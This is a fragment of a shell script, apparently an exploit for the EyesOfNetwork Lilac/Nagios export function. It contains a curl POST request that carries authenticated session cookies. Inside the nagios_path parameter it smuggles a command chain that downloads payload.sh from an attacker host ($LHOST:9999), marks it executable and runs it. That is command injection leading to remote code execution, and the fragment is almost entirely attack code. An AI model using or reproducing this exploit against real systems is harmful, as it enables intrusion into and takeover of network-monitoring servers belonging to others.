...
curl -i -s -k -X $'POST' \
    ...
    -b $"PHPSESSID=$COOKIE; session_id=$COOKIE; user_name=$LOGIN; user_id=1; user_limitation=0; group_id=1" \
    --data-binary $"request=export&job_name=az&job_description=az&job_engine=NagiosExportEngine&preflight_check=on&restart_nagios=on&nagios_path=%2Fsrv%2Feyesofnetwork%2Fnagios%2Fbin%2Fnagios+-v+%2Ftmp%2Flilac-export-1%2Fnagios.cfg+%26%26+curl+http%3A%2F%2F$LHOST%3A9999%2Fpayload.sh+-o+%2Ftmp%2Flilac-export-1%2Fpayload.sh+%26%26+chmod+%2Bx+%2Ftmp%2Flilac-export-1%2Fpayload.sh+%26%26+cd+%2Ftmp%2Flilac-export-1%2F+%26%26+.%2Fpayload.sh+%26%26+.%2Fpayload.sh" \
